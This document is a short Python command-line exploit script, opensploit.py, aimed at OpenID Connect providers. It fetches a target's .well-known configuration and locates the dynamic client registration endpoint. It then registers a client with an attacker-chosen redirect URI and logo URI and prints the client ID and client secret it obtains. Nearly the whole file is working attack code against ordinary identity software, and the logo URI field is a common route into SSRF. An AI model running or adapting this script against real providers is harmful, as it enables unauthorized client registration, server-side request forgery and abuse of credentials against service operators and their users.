import click
import json
import requests

@click.command()
@click.option('--url','-u',help='Target URL. ./opensploit.py -u https://your-target.com -r https://example.com -l https://your_url.com')
@click.option('--register','-r',default="https://example.com/",help='Domain to register on the target, default : https://example.com , ./opensploit.py -u https://your-target.com -r https://example.com -l https://your_url.com')
@click.option('--logouri','-l',help='Logo URL. ./opensploit.py -u https://your-target.com -r https://example.com -l https://your_url.com')


def main(url,register,logouri):
    if url != None or logouri != None:
        exploit(url,register,logouri)
    else:
        print("Usage : ./opensploit.py -u https://your-target.com -r https://example.com -l https://your_url.com")

def exploit(target,register,logouri):
    PAYLOAD = {"redirect_uris" : [f"{register}"],"logo_uri" : f"{logouri}"}
    HEADER = {"Content-Type":"application/json"}

    if "/.well-known/" in target:
        config = requests.get(target)
        print(f'\033[94m[ + ] Exploitation of open id on the domain {target}\033[0m')
        if config.status_code == 200:
            print('\033[92m[ + ] Openid configuration found.\033[0m')
            config = json.loads(config.text)
            try:
                regsiter_endpoint = config["registration_endpoint"]
                print(f'\033[92m[ + ] Registration endpoint found: {regsiter_endpoint}\033[0m')
                try:
                    add_endpoint = requests.post(regsiter_endpoint,json=PAYLOAD,headers=HEADER)
                    infos = json.loads(add_endpoint.text)
                    client_id = infos['client_id']
                    client_secret = infos['client_secret']
                    logo_uri = infos['logo_uri']
                    print(f"\033[92m[ + ] Successful client registration !!!.\033[0m\n\nClien id: {client_id}\n\nClient secret: {client_secret}\n\nLogo uri: {logo_uri}")
                
                except:
                    print("Error during registration ...")
            except:
                print('\033[91m[ - ] Registration endpoint not found.\033[0m')
        else:
            print('\033[91m[ - ] Openid configuration not found.\033[0m')
    else:
        print('\033[91m[ - ] Please specify openid configuration file in the url.\033[0m')

if __name__=="__main__":
    main()
